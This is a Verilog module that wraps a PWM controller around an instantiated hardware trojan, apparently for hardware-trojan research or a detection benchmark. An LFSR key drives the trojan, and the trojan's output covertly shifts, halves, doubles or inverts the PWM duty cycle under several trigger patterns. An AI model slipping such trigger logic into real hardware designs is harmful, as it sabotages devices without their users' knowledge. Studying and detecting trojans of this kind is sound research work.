// PWM Host Circuit for Trojan0
// Fixed I/O to match Trojan0: key[127:0] -> load[63:0]
module trojan0_pwm_host #(
    parameter [127:0] KEY_INIT = 128'hFEDCBA9876543210123456789ABCDEF0,  // PWM key seed
    parameter [19:0] TROJ_INIT_VALUE = 20'b10011001100110011001
)(
    input wire clk,
    input wire rst,
    input wire [PWM_WIDTH-1:0] duty_cycle,
    input wire [PWM_WIDTH-1:0] period,
    input wire pwm_enable,
    output reg pwm_out,
    output reg period_complete
);

    // Sizing parameters (converted from parameter to localparam)
    localparam PWM_WIDTH = 8;     // PWM counter width
    localparam PRESCALER = 8;     // Clock prescaler value

    // Trojan interface (fixed width)
    wire [127:0] trojan_key;
    wire [63:0] trojan_load;
    
    // PWM state
    reg [PWM_WIDTH-1:0] pwm_counter;
    reg [$clog2(PRESCALER)-1:0] prescaler_counter;
    reg [127:0] key_generator;
    reg pwm_tick;
    reg [3:0] cycle_count;
    
    // Strong key generation with LFSR-like feedback
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            key_generator <= KEY_INIT;
            cycle_count <= 4'h0;
        end else if (pwm_tick) begin
            // Strong feedback polynomial using multiple taps
            key_generator <= {key_generator[126:0], 
                             key_generator[127] ^ key_generator[126] ^ key_generator[125] ^ key_generator[124] ^
                             key_generator[96] ^ key_generator[64] ^ key_generator[32] ^ key_generator[0] ^
                             pwm_counter[PWM_WIDTH-1] ^ duty_cycle[PWM_WIDTH-1] ^ period[PWM_WIDTH-1]};
            
            // Additional mixing on period completion
            if (period_complete) begin
                cycle_count <= cycle_count + 1;
                // XOR entire key with rotated version for stronger mixing
                key_generator <= key_generator ^ {key_generator[63:0], key_generator[127:64]};
            end
        end
    end
    
    assign trojan_key = key_generator;
    
    // Proper clock prescaler
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            prescaler_counter <= {$clog2(PRESCALER){1'b0}};
            pwm_tick <= 1'b0;
        end else begin
            if (prescaler_counter == $clog2(PRESCALER)'(PRESCALER-1)) begin
                prescaler_counter <= {$clog2(PRESCALER){1'b0}};
                pwm_tick <= pwm_enable;
            end else begin
                prescaler_counter <= prescaler_counter + 1;
                pwm_tick <= 1'b0;
            end
        end
    end
    
    // Main PWM counter - correct implementation
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            pwm_counter <= {PWM_WIDTH{1'b0}};
            period_complete <= 1'b0;
        end else if (pwm_tick) begin
            if (pwm_counter == period) begin  // Correct comparison
                pwm_counter <= {PWM_WIDTH{1'b0}};
                period_complete <= 1'b1;
            end else begin
                pwm_counter <= pwm_counter + 1;
                period_complete <= 1'b0;
            end
        end else begin
            period_complete <= 1'b0;
        end
    end
    
    // Trojan-influenced PWM output generation
    // The trojan subtly modifies PWM timing by affecting duty cycle comparison
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            pwm_out <= 1'b0;
        end else if (pwm_enable) begin
            // Trojan injection: multiple trigger conditions for higher activation rate
            if (trojan_load[7:0] == 8'hCA) begin
                // Primary trojan pattern: increase duty cycle by 2
                pwm_out <= (pwm_counter <= (duty_cycle + 2));
            end else if (trojan_load[15:8] == 8'hFE) begin
                // Secondary pattern: decrease duty cycle by 2  
                pwm_out <= (pwm_counter <= (duty_cycle > 2 ? duty_cycle - 2 : {PWM_WIDTH{1'b0}}));
            end else if (trojan_load[23:16] == 8'hBA) begin
                // Tertiary pattern: shift by 3 counts
                pwm_out <= (pwm_counter <= (duty_cycle + 3));
            end else if (trojan_load[31:24] == 8'hBE) begin
                // Fourth pattern: invert PWM phase 
                pwm_out <= (pwm_counter > duty_cycle);
            end else if (trojan_load[4:0] == 5'b10101) begin
                // Fifth pattern: triggered by lower 5 bits pattern
                pwm_out <= (pwm_counter <= (duty_cycle >> 1));  // Half duty cycle
            end else if (trojan_load[12:8] == 5'b01010) begin
                // Sixth pattern: double duty cycle effect
                pwm_out <= (pwm_counter <= (duty_cycle << 1));
            end else begin
                pwm_out <= (pwm_counter <= duty_cycle);  // Normal PWM logic
            end
        end else begin
            pwm_out <= 1'b0;
        end
    end
    
    
    // Instantiate Trojan0
    Trojan0 #(
        .INIT_VALUE(TROJ_INIT_VALUE)
    ) trojan_inst (
        .clk(clk),
        .rst(rst),
        .key(trojan_key),
        .load(trojan_load)
    );

endmodule
